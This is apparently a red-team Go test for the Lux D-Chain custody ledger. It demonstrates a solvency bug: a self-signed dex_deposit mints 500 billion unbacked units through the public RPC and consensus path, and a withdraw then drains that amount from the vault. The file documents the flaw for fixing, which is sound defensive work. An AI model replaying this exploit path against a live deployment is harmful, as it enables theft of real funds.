// Copyright (C) 2019-2026, Lux Industries Inc. All rights reserved.
// See the file LICENSE for licensing terms.
//
// redteam_unbacked_deposit_test.go — RED TEAM (infinite money). The D-Chain custody
// ledger has NO in-protocol solvency invariant: TxDeposit (dex_deposit) credits the
// signer's OWN account an ARBITRARY amount, authorized ONLY by that account's own
// signature over (user, asset, amount, ref) + a nonzero ref. There is NO proof that
// value was escrowed on the C-Chain (the backed funding path is TxImport, which
// consumes a real C->D intent object). The public RPC surface (RegisterDEX /
// CreateHandlers / ingest.go httpHandlers) exposes dex_deposit at
// /ext/bc/<chainID>/dex/dex_deposit — the SAME public route group as the mandatory
// dex_place / dex_submit trading methods. So any principal who can reach the trading
// RPC can MINT unlimited balance and drain the vault via withdraw.
package dchain

import (
	"context"
	"testing"

	"github.com/luxfi/database/memdb"
)

func TestRedteam_UnbackedSelfSignedDepositMints(t *testing.T) {
	vm, _ := newTestVM(t, memdb.New())
	defer vm.Shutdown(context.Background())

	const attacker = "attacker"
	// A colossal, entirely unbacked amount. No prior deposit, no TxImport, no C-side
	// lock — the attacker has escrowed NOTHING.
	const minted uint64 = 500_000_000_000

	// Sanity: attacker starts with zero of the asset.
	if a, l, _ := vm.Balance(wireUser(t, attacker), assetLUX); a != 0 || l != 0 {
		t.Fatalf("precondition: attacker not empty (avail=%d locked=%d)", a, l)
	}

	// ONE self-signed deposit tx (attacker's first op, nonce 0). depositTx builds
	// exactly the frame class a client posts to dex_deposit.
	tx := depositTx(t, attacker, assetLUX, minted)

	// (1) PUBLIC-BOUNDARY REACHABILITY: reconstruct the EXACT client wire frame the
	// caller POSTs to dex_deposit (body ‖ auth envelope) and run the boundary check
	// submitTx/handleDeposit apply at the PUBLIC RPC edge. It PASSES (signer ==
	// credited account), so the public endpoint admits an unbacked self-deposit.
	frame := append(append([]byte{}, tx.Body...), tx.Auth.encode()...)
	parsed, err := parseTxFrame(TxDeposit, frame)
	if err != nil {
		t.Fatalf("frame parse: %v", err)
	}
	if _, verr := verifyTxSignature(parsed); verr != nil {
		t.Fatalf("public dex_deposit boundary REJECTED the self-signed frame: %v", verr)
	}

	// (2) CONSENSUS ACCEPTANCE: the authoritative gate (authorizeTx -> verifyTxSignature
	// -> nonce) accepts the SAME tx — no backing is ever checked. Drive it through
	// BuildBlock -> Verify -> Accept.
	addBlock(t, vm, tx)
	avail, _, _ := vm.Balance(wireUser(t, attacker), assetLUX)
	if avail != minted {
		t.Fatalf("expected minted balance %d, got %d", minted, avail)
	}
	t.Logf("MINTED %d %x from a self-signature — attacker escrowed nothing", minted, assetLUX[:4])

	// (3) DRAIN: the minted balance is fully withdrawable — the proxy/vault would
	// export `minted` REAL tokens for value that was never deposited. This is the
	// solvency break: exports exceed imports by the entire minted amount.
	_, wo := addBlockOutcomes(t, vm, withdrawTx(t, attacker, assetLUX, minted))
	realized := withdrawRealizedOf(wo, TxWithdraw)
	if realized != minted {
		t.Fatalf("expected to drain %d, realized %d", minted, realized)
	}

	t.Errorf("RED FINDING (INFINITE MONEY): a self-signed dex_deposit minted %d unbacked units "+
		"(no TxImport, no C-side lock) and withdrew all %d — the custody ledger has no in-protocol "+
		"backing invariant; solvency depends ENTIRELY on dex_deposit being unreachable by attackers, "+
		"but ingest.go exposes it on the same public route as dex_place/dex_submit", minted, realized)
}
